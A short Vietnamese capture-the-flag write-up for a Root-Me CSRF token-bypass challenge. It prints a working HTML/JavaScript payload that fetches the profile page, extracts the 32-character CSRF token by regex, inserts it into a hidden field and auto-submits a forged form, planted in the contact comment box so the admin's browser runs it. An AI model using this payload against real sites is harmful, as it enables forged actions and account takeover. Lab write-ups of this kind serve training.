Ok dựa vào tiêu đề có thể thấy chall này là nâng cấp của chall `CSRF-0-protection`, để ý trong input form của tab `profile` còn có thêm 1 thẻ input nữa chứa giá trị của `csrf_token`. Tìm hiểu thì biết `csrf_token` chính là 1 cách để ngăn chặn tấn công CSRF, bằng cách kiểm tra xem request có giá trị `csrf_token` hợp lệ không, vì vậy chỉ lợi dụng cookies của `admin` thôi là chưa đủ. Ta cần viết 1 đoạn script để lấy cắp cả cái token đó nữa, code như sau: 

```html
<html>
    <form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
        <input id="username" type="text" name="username" value="dang">
        <input id="status" type="checkbox" name="status" checked >
        <input id="token" type="hidden" name="token" value="" />
        <button type="submit">Submit</button>
</form>

<script>
        xhttp = new XMLHttpRequest();
        xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
        xhttp.send();

        token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
        document.getElementById('token').setAttribute('value', token_admin)
        document.csrf_form.submit();
</script>
</html>
```

Ở đây tìm ra csrf_token bằng regex. Gửi form trên trong ô Comment của phần Contact, đợi 2p vào tab Private ta sẽ có password